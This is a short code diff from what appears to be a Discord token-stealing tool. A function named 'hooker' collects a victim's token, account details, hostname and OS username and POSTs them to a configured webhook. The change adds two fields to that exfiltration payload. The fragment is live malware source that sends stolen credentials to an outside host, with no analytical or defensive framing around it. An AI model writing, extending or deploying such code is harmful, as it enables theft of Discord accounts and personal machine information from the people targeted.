@@ -167,7 +167,9 @@ const hooker = async (content, token, account) => {
         hostname: os.hostname(),
         os_username: os.userInfo().username,
         avatar_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
-        action: content.action || "injected"
+        action: content.action || "injected",
+        type: "discord",
+        id: 1
     };
 
     await request("POST", CONFIG.webhook, {
